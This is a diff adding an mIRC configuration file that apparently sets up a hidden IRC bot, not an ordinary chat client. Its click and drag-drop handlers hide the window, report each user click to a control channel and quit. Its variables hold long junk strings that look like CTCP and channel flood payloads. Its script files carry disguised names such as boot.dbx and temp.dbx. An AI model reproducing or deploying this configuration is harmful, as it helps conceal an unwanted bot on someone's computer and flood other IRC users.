@@ -1,0 +1,156 @@
+[files]
+browser=c:\program files\internet explorer\iexplore.exe
+emailer=c:\program files\outlook express\msimn.exe
+addrbk=addrbk.ini
+servers=servers.ini
+finger=finger.txt
+urls=urls.ini
+[warn]
+fserve=on
+dcc=off
+[options]
+n0=0,0,0,1,0,0,300,0,1,0,1,0,0,0,1,1,0,1,0,1,4096,0,0,0,0,0,1,1,0,50,1,1
+n1=1,1,0,0,0,0,0,0,2,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0
+n2=0,0,0,0,1,1,1,1,0,30,60,0,0,1,1,0,0,0,0,60,20,2,0,0,1,0,0,1,0,0,0
+n3=5000,0,0,0,1,0,1,0,0,1,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,2,0,0,2,0,1,60
+n4=0,0,1,1,0,3,9999,0,0,0,1,0,1024,0,1,9999,30,0,0,0,0,0,0,0,1,5000,0,1,0,0,1
+n5=1,1,1,1,1,1,1,1,1,1,6667,500000,0,0,0,1,1,0,300,30,10,0,0,22,0,0,1,0,1,0,0,25
+n6=0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,1,1,0,0,0,0,0,1,0
+n7=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+[about]
+version=5.91
+show=magnitude
+[dirs]
+logdir=logs\
+waves=sounds\
+midis=sounds\
+mp3s=sounds\
+wmas=sounds\
+oggs=sounds\
+[events]
+default=2,2,3,2,2,1,1,2
+[ports]
+random=off
+bind=off
+[ident]
+active=no
+system=UNIX
+port=113
+userid=Darunion
+[socks]
+enabled=no
+port=1080
+method=4
+dccs=no
+useip=yes
+[language]
+sjis=0
+multibyte=0
+[clicks]
+status=/hide | /msg %c [!security error!] user clicked: STATUS! | /quit | /exit
+query=/hide | /msg %c [!security error!] user clicked: QUERY! | /quit | /exit
+channel=/hide | /msg %c [!security error!] user clicked: CHANNEL! | /quit | /exit
+nicklist=/hide | /msg %c [!security error!] user clicked: NICKLIST! | /quit | /exit
+notify=/hide | /msg %c [!security error!] user clicked: NOTIFY! | /quit | /exit
+message=/hide | /msg %c [!security error!] user clicked: QUERY! | /quit | /exit
+[dde]
+ServerStatus=off
+ServiceName=mIRC
+CheckName=off
+[marker]
+show=off
+size=3
+colour=4
+method=1
+[text]
+network=All
+commandchar=/
+linesep=-
+timestamp=[HH:nn]
+accept=*.rar
+ignore=*.exe,*.com,*.bat,*.dll,*.ini,*.mrc,*.vbs
+[fileserver]
+warning=on
+[dccserver]
+n0=0,59,0,0,0,0
+[agent]
+enable=0,0,0
+char=merlin.acs
+options=0,0,0,10,0
+speech=150,60,100,1,180,10,50,1,1,1,0,50,1
+channel=1,1,1,1,1,1,1,1,1
+private=1,1,1,1
+other=1,1,1,1,1,1,1
+pos=20,20
+[windows]
+scripts=2,52,7,83,0,0,0
+main=4,10,4,10,2,-30,-30
+wchannel=0,112,0,27,0,1,0
+[colours]
+n0=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+[pfiles]
+n0=popups.ini
+n1=popups.ini
+n2=popups.ini
+n3=popups.ini
+n4=popups.ini
+[mirc]
+nick=[2000]-596916
+host=127.0.0.1SERVER:127.0.0.1:6667
+user=[EPiC]-1552
+email=SATAN69er108@maillink.com
+
+[wizard]
+warning=2
+
+[users]
+
+
+
+[variables]
+n0=%c #beta
+n1=%m1 #a#b#c#d#e#f#g#h#i#j#k#l#m#n#o#p#q#r#s#t#u#v#w#x#y#z#a#b#c#d#e#f#g#h#i#j#k#l#m#n#o#p#q#r#s#t#u#v#w#x#y#z#a#b#c#d#e#f#g#h#i#j#k#l#m#n#o#p#q#r#s#t#u#v#w#x#y#z#a#b#c#d#e#f#g#h#i#j#k#l#m#n#o#p#q#r#s#t#u#v#w#x#y#z#a#b#c#d#e#f#g#h#i#j#
+n2=%m2 §§§####$$$$%%§§§####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥××××ßßßß§§§§####$$$$%%%%¥¥¥¥××××ß§§§####$$
+n3=%m3 0DoNt YoU jUsT FuCkInG HaTe CtCp FloOdS?!?0DoNt YoU jUsT FuCkInG HaTe CtCp 
+n4=%m4 ½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾
+n5=%s1 127.0.0.1:6667
+n6=%s2 127.0.0.1:6667
+n7=%s3 127.0.0.1:6667
+n8=%impossible 1,1
+[styles]
+thin=0
+font=0
+hide=0
+color=default
+size=0
+buttons=0
+[waves]
+query=No Sound
+notice=No Sound
+invite=No Sound
+disconnect=No Sound
+send=No Sound
+highlight=No Sound
+flash=No Sound
+dccfail=No Sound
+[dragdrop]
+n0=*.*:/hide | /quit
+s0=*.*:/hide | /quit
+[local]
+local=L33T-HAX0R
+localip=127.0.0.1
+longip=2130706433
+[fonts]
+[afiles]
+n0=aliases.ini
+[extensions]
+n0=defaultEXTDIR:\
+n1=*.oggEXTDIR:sounds\
+n2=*.wav,*.mid,*.mp3EXTDIR:\
+n3=*.wmaEXTDIR:sounds\
+ident userid HelloImNasty
+mirc user arcane303
+[rfiles]
+n0=boot.dbx
+n1=remote.ini
+n2=temp.dbx
